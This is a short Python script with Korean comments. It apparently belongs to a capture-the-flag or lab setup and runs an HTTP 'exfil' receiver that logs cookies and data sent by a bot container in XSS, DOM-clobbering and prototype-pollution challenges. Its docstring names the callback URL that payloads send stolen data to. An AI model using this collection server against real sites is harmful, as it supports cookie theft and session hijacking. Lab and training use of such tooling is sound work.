#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""공용 exfil 수신 서버 — client 문제(xss-1/2/3, domclobbering, prototype-pollution)에서
봇이 보내는 쿠키/데이터를 받는다. 봇 컨테이너는 host.docker.internal:<PORT> 로 도달한다.

사용:  python exfil_server.py            # 0.0.0.0:8000 로 수신, 콘솔+exfil.log 에 기록
       python exfil_server.py 8000       # 포트 지정
페이로드 쪽 수신지:  http://host.docker.internal:8000/?c=<data>
"""
import http.server, socketserver, datetime, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
LOG = "exfil.log"

class H(http.server.BaseHTTPRequestHandler):
    def _log(self):
        line = "%s %s\n" % (datetime.datetime.now().isoformat(timespec="seconds"), self.path)
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line)
        sys.stdout.write("EXFIL " + line); sys.stdout.flush()
    def do_GET(self):
        self._log()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers(); self.wfile.write(b"ok")
    do_POST = do_GET
    def log_message(self, *a): pass

class TCP(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

if __name__ == "__main__":
    print("[*] exfil 수신 대기: 0.0.0.0:%d  (기록: %s)" % (PORT, LOG), flush=True)
    print("[*] 봇이 보낼 수신지: http://host.docker.internal:%d/?c=..." % PORT, flush=True)
    TCP(("0.0.0.0", PORT), H).serve_forever()
